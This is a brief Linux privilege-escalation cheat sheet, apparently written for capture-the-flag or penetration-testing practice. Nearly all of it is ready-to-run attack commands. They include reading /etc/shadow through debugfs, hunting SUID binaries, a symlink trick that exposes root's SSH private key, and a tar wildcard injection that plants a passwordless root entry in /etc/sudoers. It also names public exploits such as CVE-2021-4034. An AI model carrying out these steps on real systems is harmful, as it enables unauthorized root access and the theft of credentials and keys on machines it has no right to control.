
#### SOP for Linux 

0. Disk group: id => `debugfs -w /dev/sdaX` then `cat /etc/shadow` 
1. Check sudo -l , su , env 
2. SUID `find / -perm -4000 -type f 2>/dev/null` = GTFObins (eg strace, env) 
3. Cron jobs in /etc/crontab ; PATH has /dev/shm ? Job is writable? 
4. Find creds in /var/www 
5. Find databases like *.db 
6. Exploits, eg Polkit CVE-2021-4034 , Dirty Frags 


#### Unusual exploits 
- Run `ln -s /root/.ssh/id_rsa /var/log/gitlab/root_key` then `unzip /opt/backups/backup.zip` 
- Privesc has "tar ... *" ; put `echo 'user ALL=(root) NOPASSWD: ALL' > /etc/sudoers` in payload.sh 
- - Then `echo "" > '--checkpoint=1'` and `echo "" > '--checkpoint-action=exec=sh payload.sh'` and tar. 
- Download mlocate.db to list unusual files. 
